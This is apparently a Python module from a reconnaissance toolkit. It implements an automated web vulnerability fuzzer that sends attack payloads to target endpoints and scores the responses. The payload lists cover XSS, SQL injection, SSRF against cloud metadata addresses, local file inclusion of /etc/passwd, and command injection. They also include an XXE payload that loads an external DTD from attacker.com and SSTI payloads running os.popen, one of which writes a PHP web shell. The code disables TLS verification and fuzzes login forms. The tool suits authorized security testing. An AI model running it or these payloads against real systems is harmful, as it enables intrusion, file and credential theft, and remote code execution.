"""
Advanced fuzzing framework for parameter and endpoint testing.

This module implements intelligent fuzzing with payload generation,
mutation techniques, and response analysis for vulnerability detection.
"""

import asyncio
import logging
import random
import string
import json
import base64
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Set, Any, Tuple, Union
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
import aiohttp
from itertools import product

from recon.collectors import BaseCollector


logger = logging.getLogger(__name__)


class PayloadGenerator:
    """Advanced payload generator with mutation techniques."""
    
    def __init__(self):
        self.payloads = self._load_payloads()
        self.mutation_techniques = [
            self._case_mutation,
            self._encoding_mutation,
            self._injection_mutation,
            self._boundary_mutation,
            self._special_char_mutation
        ]
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load vulnerability-specific payloads."""
        return {
            'xss': [
                '<script>alert(1)</script>',
                '<img src=x onerror=alert(1)>',
                'javascript:alert(1)',
                '<svg onload=alert(1)>',
                '"><script>alert(1)</script>',
                "'><script>alert(1)</script>",
                '<iframe src=javascript:alert(1)>',
                '<body onload=alert(1)>',
                '<details open ontoggle=alert(1)>',
                '<marquee onstart=alert(1)>',
                # Modern XSS vectors
                '<script>alert`1`</script>',
                '<script>alert(String.fromCharCode(88,83,83))</script>',
                '<script>eval(atob("YWxlcnQoMSk="))</script>',
                '${alert(1)}',
                '{{alert(1)}}',
                # Template injection
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                # Event handlers
                '<input onfocus=alert(1) autofocus>',
                '<select onfocus=alert(1) autofocus>',
                '<textarea onfocus=alert(1) autofocus>'
            ],
            
            'sqli': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR 1=1#",
                "' OR 1=1/*",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "' OR 'a'='a",
                "') OR ('1'='1",
                "') OR (1=1)--",
                # Union-based
                "' UNION SELECT 1,2,3--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' UNION ALL SELECT 1,2,3--",
                # Time-based
                "'; WAITFOR DELAY '00:00:05'--",
                "'; SELECT pg_sleep(5)--",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL)='",
                # Boolean-based
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a",
                "' AND 'a'='b",
                # Error-based
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
                "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
                # NoSQL injection
                "' || '1'=='1",
                "' || 1==1//",
                "'; return true; //",
                # LDAP injection
                "*)(&(objectClass=*",
                "*)(|(objectClass=*"
            ],
            
            'ssrf': [
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'http://169.254.169.254',  # AWS metadata
                'http://metadata.google.internal',  # GCP metadata
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/computeMetadata/v1/',
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///proc/version',
                'file:///windows/system32/drivers/etc/hosts',
                'gopher://127.0.0.1:80',
                'dict://127.0.0.1:11211',
                'ftp://127.0.0.1',
                'ldap://127.0.0.1',
                # DNS rebinding
                'http://spoofed.burpcollaborator.net',
                'http://localtest.me',
                'http://vcap.me',
                # IPv6 variations
                'http://[::ffff:127.0.0.1]',
                'http://[0:0:0:0:0:ffff:127.0.0.1]',
                # Decimal/hex encoding
                'http://2130706433',  # 127.0.0.1 in decimal
                'http://0x7f000001',  # 127.0.0.1 in hex
                'http://017700000001'  # 127.0.0.1 in octal
            ],
            
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
                '....//....//....//etc/passwd',
                '..%2f..%2f..%2fetc%2fpasswd',
                '..%252f..%252f..%252fetc%252fpasswd',
                '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
                'file:///etc/passwd',
                'php://filter/read=convert.base64-encode/resource=index.php',
                'php://filter/convert.base64-encode/resource=config.php',
                'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',
                'expect://id',
                '/proc/self/environ',
                '/proc/version',
                '/proc/cmdline',
                # Windows paths
                'C:\\windows\\system32\\drivers\\etc\\hosts',
                'C:\\boot.ini',
                'C:\\windows\\win.ini',
                'C:\\windows\\system.ini',
                # Log files
                '/var/log/apache2/access.log',
                '/var/log/nginx/access.log',
                '/var/log/auth.log',
                '/var/log/messages'
            ],
            
            'rce': [
                '; id',
                '| id',
                '& id',
                '&& id',
                '|| id',
                '`id`',
                '$(id)',
                '; whoami',
                '| whoami',
                '& whoami',
                '`whoami`',
                '$(whoami)',
                '; cat /etc/passwd',
                '| cat /etc/passwd',
                '; ls -la',
                '| ls -la',
                # Windows commands
                '& dir',
                '| dir',
                '& type C:\\windows\\system32\\drivers\\etc\\hosts',
                # PHP functions
                'system("id")',
                'exec("id")',
                'shell_exec("id")',
                'passthru("id")',
                'eval("system(\'id\');")',
                # Python
                '__import__("os").system("id")',
                'eval("__import__(\'os\').system(\'id\')")',
                # Node.js
                'require("child_process").exec("id")',
                # Template injection RCE
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
            ],
            
            'idor': [
                '1', '2', '3', '0', '-1',
                'admin', 'administrator', 'root', 'user',
                'true', 'false',
                '[]', '{}', 'null',
                # UUID variations
                '00000000-0000-0000-0000-000000000000',
                '11111111-1111-1111-1111-111111111111',
                # Encoded variations
                'YWRtaW4=',  # base64 'admin'
                'dXNlcg==',  # base64 'user'
                '%61%64%6d%69%6e',  # URL encoded 'admin'
                # Array manipulation
                '[0]', '[1]', '["admin"]', '["user"]',
                # Object manipulation
                '{"id":1}', '{"user":"admin"}', '{"role":"admin"}'
            ],
            
            'xxe': [
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo></foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
                '<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>',
                # Billion laughs
                '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>'
            ],
            
            'ssti': [
                '{{7*7}}',
                '${7*7}',
                '#{7*7}',
                '{{config}}',
                '{{self}}',
                '{{request}}',
                '{{config.__class__.__init__.__globals__}}',
                '{{"".__class__.__mro__[2].__subclasses__()}}',
                '{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
                # Jinja2
                '{{request.application.__globals__.__builtins__.__import__(\'os\').popen(\'id\').read()}}',
                # Twig
                '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
                # Smarty
                '{php}echo `id`;{/php}',
                '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}'
            ]
        }
    
    def generate_payloads(self, vuln_type: str, param_name: str = '', 
                         original_value: str = '', count: int = 50) -> List[str]:
        """Generate payloads for specific vulnerability type."""
        
        if vuln_type not in self.payloads:
            return []
        
        base_payloads = self.payloads[vuln_type]
        generated_payloads = []
        
        # Add base payloads
        generated_payloads.extend(base_payloads[:count//2])
        
        # Generate mutated payloads
        for payload in base_payloads[:count//4]:
            for mutation_func in self.mutation_techniques:
                try:
                    mutated = mutation_func(payload, param_name, original_value)
                    if mutated and mutated not in generated_payloads:
                        generated_payloads.append(mutated)
                        if len(generated_payloads) >= count:
                            break
                except:
                    continue
            if len(generated_payloads) >= count:
                break
        
        return generated_payloads[:count]
    
    def _case_mutation(self, payload: str, param_name: str, original_value: str) -> str:
        """Apply case mutations to payload."""
        mutations = [
            payload.upper(),
            payload.lower(),
            payload.capitalize(),
            payload.swapcase()
        ]
        return random.choice(mutations)
    
    def _encoding_mutation(self, payload: str, param_name: str, original_value: str) -> str:
        """Apply encoding mutations to payload."""
        mutations = [
            urllib.parse.quote(payload),
            urllib.parse.quote_plus(payload),
            base64.b64encode(payload.encode()).decode(),
            payload.encode('unicode_escape').decode(),
            ''.join(f'%{ord(c):02x}' for c in payload)
        ]
        return random.choice(mutations)
    
    def _injection_mutation(self, payload: str, param_name: str, original_value: str) -> str:
        """Apply injection-specific mutations."""
        if original_value:
            return f"{original_value}{payload}"
        return payload
    
    def _boundary_mutation(self, payload: str, param_name: str, original_value: str) -> str:
        """Apply boundary value mutations."""
        boundaries = ['', ' ', '\n', '\r\n', '\t', '\0']
        boundary = random.choice(boundaries)
        return f"{boundary}{payload}{boundary}"
    
    def _special_char_mutation(self, payload: str, param_name: str, original_value: str) -> str:
        """Apply special character mutations."""
        special_chars = ['\'', '"', '`', '\\', '/', '<', '>', '&', '|', ';']
        char = random.choice(special_chars)
        return f"{char}{payload}{char}"


class ResponseAnalyzer:
    """Analyzes responses for vulnerability indicators."""
    
    def __init__(self):
        self.vulnerability_indicators = {
            'xss': [
                r'<script[^>]*>.*?</script>',
                r'javascript:',
                r'onerror\s*=',
                r'onload\s*=',
                r'alert\s*\(',
                r'confirm\s*\(',
                r'prompt\s*\('
            ],
            'sqli': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_',
                r'valid MySQL result',
                r'MySqlClient\.',
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wpg_',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'Driver.*SQL.*Server',
                r'OLE DB.*SQL Server',
                r'(\W|\A)SQL Server.*Driver',
                r'Warning.*mssql_',
                r'Microsoft OLE DB Provider for ODBC Drivers',
                r'Microsoft OLE DB Provider for SQL Server',
                r'Incorrect syntax near',
                r'ORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver',
                r'Warning.*\Woci_',
                r'Warning.*\Wora_'
            ],
            'lfi': [
                r'root:.*:0:0:',
                r'daemon:.*:1:1:',
                r'bin:.*:2:2:',
                r'\[boot loader\]',
                r'\[operating systems\]',
                r'# /etc/passwd',
                r'# /etc/shadow',
                r'Warning.*include\(',
                r'Warning.*require\(',
                r'Fatal error.*include\(',
                r'Failed opening.*for inclusion'
            ],
            'rce': [
                r'uid=\d+\(.*?\)',
                r'gid=\d+\(.*?\)',
                r'groups=\d+\(.*?\)',
                r'total \d+',
                r'drwxr-xr-x',
                r'-rw-r--r--',
                r'Volume.*Serial Number',
                r'Directory of C:\\',
                r'<DIR>',
                r'Microsoft Windows'
            ],
            'ssrf': [
                r'Connection refused',
                r'Connection timeout',
                r'No route to host',
                r'Internal Server Error',
                r'HTTP/1\.[01] 200',
                r'HTTP/1\.[01] 404',
                r'HTTP/1\.[01] 500',
                r'ami-id',
                r'instance-id',
                r'local-hostname',
                r'security-groups'
            ],
            'xxe': [
                r'root:.*:0:0:',
                r'daemon:.*:1:1:',
                r'\[boot loader\]',
                r'XML.*error',
                r'External entity',
                r'DOCTYPE.*ENTITY'
            ],
            'ssti': [
                r'49',  # 7*7
                r'TemplateSyntaxError',
                r'UndefinedError',
                r'Template.*Error',
                r'Jinja2.*Error',
                r'Twig.*Error'
            ]
        }
        
        self.error_indicators = [
            'error', 'exception', 'warning', 'fatal', 'debug',
            'stack trace', 'traceback', 'line \d+', 'file.*line'
        ]
    
    def analyze_response(self, response_data: Dict[str, Any], 
                        payload: str, vuln_type: str) -> Dict[str, Any]:
        """Analyze response for vulnerability indicators."""
        
        analysis = {
            'vulnerable': False,
            'confidence': 0.0,
            'indicators': [],
            'response_changes': {},
            'error_detected': False,
            'payload_reflected': False
        }
        
        content = response_data.get('content', '')
        status_code = response_data.get('status_code', 0)
        headers = response_data.get('headers', {})
        response_time = response_data.get('response_time', 0)
        
        # Check for vulnerability-specific indicators
        if vuln_type in self.vulnerability_indicators:
            for pattern in self.vulnerability_indicators[vuln_type]:
                import re
                if re.search(pattern, content, re.IGNORECASE):
                    analysis['indicators'].append(pattern)
                    analysis['vulnerable'] = True
                    analysis['confidence'] += 0.3
        
        # Check for payload reflection
        if payload in content:
            analysis['payload_reflected'] = True
            analysis['confidence'] += 0.2
        
        # Check for error indicators
        for error_pattern in self.error_indicators:
            import re
            if re.search(error_pattern, content, re.IGNORECASE):
                analysis['error_detected'] = True
                analysis['confidence'] += 0.1
                break
        
        # Analyze response changes
        baseline_status = response_data.get('baseline_status', status_code)
        baseline_length = response_data.get('baseline_length', len(content))
        
        if status_code != baseline_status:
            analysis['response_changes']['status_code'] = {
                'baseline': baseline_status,
                'current': status_code
            }
            analysis['confidence'] += 0.1
        
        length_diff = abs(len(content) - baseline_length)
        if length_diff > 100:  # Significant content change
            analysis['response_changes']['content_length'] = {
                'baseline': baseline_length,
                'current': len(content),
                'difference': length_diff
            }
            analysis['confidence'] += 0.1
        
        # Time-based detection for SQLi
        if vuln_type == 'sqli' and response_time > 5:
            analysis['indicators'].append('time_delay_detected')
            analysis['vulnerable'] = True
            analysis['confidence'] += 0.4
        
        # Limit confidence to 1.0
        analysis['confidence'] = min(analysis['confidence'], 1.0)
        
        return analysis


class FuzzingEngine:
    """Advanced fuzzing engine with intelligent testing."""
    
    def __init__(self):
        self.payload_generator = PayloadGenerator()
        self.response_analyzer = ResponseAnalyzer()
        self.tested_combinations = set()
        self.vulnerability_findings = []
    
    async def fuzz_endpoint(self, endpoint_data: Dict[str, Any], **kwargs) -> Dict[str, Any]:
        """Fuzz a single endpoint with various payloads."""
        
        url = endpoint_data.get('url', '')
        method = endpoint_data.get('method', 'GET').upper()
        parameters = endpoint_data.get('parameters', [])
        
        fuzz_results = {
            'endpoint': url,
            'method': method,
            'parameters_tested': [],
            'vulnerabilities_found': [],
            'total_requests': 0,
            'successful_requests': 0,
            'error_requests': 0,
            'baseline_response': None
        }
        
        if not url or not parameters:
            return fuzz_results
        
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(ssl=False, limit=20)
        ) as session:
            
            # Get baseline response
            baseline_response = await self._get_baseline_response(session, url, method, parameters)
            fuzz_results['baseline_response'] = baseline_response
            
            # Test each parameter
            for param_name in parameters:
                param_results = await self._fuzz_parameter(
                    session, url, method, parameters, param_name, baseline_response, **kwargs
                )
                fuzz_results['parameters_tested'].append(param_results)
                fuzz_results['total_requests'] += param_results.get('requests_made', 0)
                fuzz_results['successful_requests'] += param_results.get('successful_requests', 0)
                fuzz_results['error_requests'] += param_results.get('error_requests', 0)
                
                # Collect vulnerabilities
                for vuln in param_results.get('vulnerabilities', []):
                    fuzz_results['vulnerabilities_found'].append(vuln)
        
        return fuzz_results
    
    async def _get_baseline_response(self, session: aiohttp.ClientSession, 
                                   url: str, method: str, parameters: List[str]) -> Optional[Dict[str, Any]]:
        """Get baseline response for comparison."""
        
        try:
            # Create baseline request with normal values
            baseline_params = {param: 'test' for param in parameters}
            
            if method == 'GET':
                async with session.get(url, params=baseline_params) as response:
                    content = await response.text()
                    return {
                        'status_code': response.status,
                        'content': content,
                        'content_length': len(content),
                        'headers': dict(response.headers),
                        'response_time': 0  # Not measuring for baseline
                    }
            elif method == 'POST':
                async with session.post(url, data=baseline_params) as response:
                    content = await response.text()
                    return {
                        'status_code': response.status,
                        'content': content,
                        'content_length': len(content),
                        'headers': dict(response.headers),
                        'response_time': 0
                    }
        except Exception as e:
            logger.debug(f"Failed to get baseline response: {e}")
            return None
    
    async def _fuzz_parameter(self, session: aiohttp.ClientSession, url: str, 
                            method: str, parameters: List[str], target_param: str,
                            baseline_response: Optional[Dict[str, Any]], **kwargs) -> Dict[str, Any]:
        """Fuzz a specific parameter with various payloads."""
        
        param_results = {
            'parameter': target_param,
            'vulnerabilities': [],
            'requests_made': 0,
            'successful_requests': 0,
            'error_requests': 0,
            'payloads_tested': []
        }
        
        # Get vulnerability types to test
        vuln_types = kwargs.get('vulnerability_types', ['xss', 'sqli', 'lfi', 'rce', 'ssrf'])
        max_payloads_per_type = kwargs.get('max_payloads_per_type', 20)
        
        # Test each vulnerability type
        for vuln_type in vuln_types:
            payloads = self.payload_generator.generate_payloads(
                vuln_type, target_param, 'test', max_payloads_per_type
            )
            
            for payload in payloads:
                try:
                    # Create test parameters
                    test_params = {param: 'test' for param in parameters}
                    test_params[target_param] = payload
                    
                    # Make request
                    start_time = asyncio.get_event_loop().time()
                    
                    if method == 'GET':
                        async with session.get(url, params=test_params) as response:
                            content = await response.text()
                            response_time = asyncio.get_event_loop().time() - start_time
                    elif method == 'POST':
                        async with session.post(url, data=test_params) as response:
                            content = await response.text()
                            response_time = asyncio.get_event_loop().time() - start_time
                    else:
                        continue
                    
                    param_results['requests_made'] += 1
                    
                    if response.status < 500:
                        param_results['successful_requests'] += 1
                    else:
                        param_results['error_requests'] += 1
                    
                    # Analyze response
                    response_data = {
                        'status_code': response.status,
                        'content': content,
                        'headers': dict(response.headers),
                        'response_time': response_time,
                        'baseline_status': baseline_response.get('status_code', 200) if baseline_response else 200,
                        'baseline_length': baseline_response.get('content_length', 0) if baseline_response else 0
                    }
                    
                    analysis = self.response_analyzer.analyze_response(
                        response_data, payload, vuln_type
                    )
                    
                    param_results['payloads_tested'].append({
                        'payload': payload,
                        'vulnerability_type': vuln_type,
                        'analysis': analysis
                    })
                    
                    # Check if vulnerability found
                    if analysis['vulnerable'] and analysis['confidence'] > 0.5:
                        vulnerability = {
                            'parameter': target_param,
                            'payload': payload,
                            'vulnerability_type': vuln_type,
                            'confidence': analysis['confidence'],
                            'indicators': analysis['indicators'],
                            'response_data': response_data,
                            'timestamp': datetime.utcnow().isoformat()
                        }
                        param_results['vulnerabilities'].append(vulnerability)
                
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
                    param_results['error_requests'] += 1
                    continue
        
        return param_results


class FuzzingCollector(BaseCollector):
    """Fuzzing collector for vulnerability detection."""
    
    def __init__(self):
        super().__init__("vulnerability_fuzzing")
        self.fuzzing_engine = FuzzingEngine()
    
    async def collect(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Perform fuzzing-based vulnerability detection."""
        
        # Get endpoints to fuzz (from previous content discovery)
        endpoints = kwargs.get('endpoints', [])
        if not endpoints:
            # If no endpoints provided, try basic discovery
            endpoints = await self._discover_basic_endpoints(target)
        
        # Run fuzzing on each endpoint
        for endpoint in endpoints:
            try:
                fuzz_results = await self.fuzzing_engine.fuzz_endpoint(endpoint, **kwargs)
                
                # Store main results
                self.add_result({
                    'type': 'fuzzing_results',
                    'target': target,
                    'endpoint': endpoint,
                    'fuzz_data': fuzz_results
                })
                
                # Process vulnerabilities
                for vulnerability in fuzz_results.get('vulnerabilities_found', []):
                    self.add_result({
                        'type': 'vulnerability_found',
                        'target': target,
                        'vulnerability': vulnerability
                    })
            
            except Exception as e:
                logger.error(f"Failed to fuzz endpoint {endpoint}: {e}")
                continue
        
        return self.results
    
    async def _discover_basic_endpoints(self, target: str) -> List[Dict[str, Any]]:
        """Basic endpoint discovery if none provided."""
        
        # Ensure target is a full URL
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        # Basic endpoints to test
        basic_endpoints = [
            {'url': target, 'method': 'GET', 'parameters': ['id', 'user', 'search', 'q']},
            {'url': f"{target}/search", 'method': 'GET', 'parameters': ['q', 'query', 'term']},
            {'url': f"{target}/login", 'method': 'POST', 'parameters': ['username', 'password']},
            {'url': f"{target}/contact", 'method': 'POST', 'parameters': ['name', 'email', 'message']},
            {'url': f"{target}/api/users", 'method': 'GET', 'parameters': ['id', 'limit', 'offset']}
        ]
        
        return basic_endpoints


# Standalone usage
if __name__ == "__main__":
    async def test_fuzzing():
        collector = FuzzingCollector()
        
        # Test endpoint
        test_endpoints = [
            {
                'url': 'https://httpbin.org/get',
                'method': 'GET',
                'parameters': ['test_param']
            }
        ]
        
        results = await collector.collect(
            "https://httpbin.org",
            endpoints=test_endpoints,
            vulnerability_types=['xss', 'sqli'],
            max_payloads_per_type=5
        )
        
        print(f"Fuzzing completed with {len(results)} results")
        for result in results[:5]:
            print(f"- {result.get('type')}: {result}")
    
    asyncio.run(test_fuzzing())
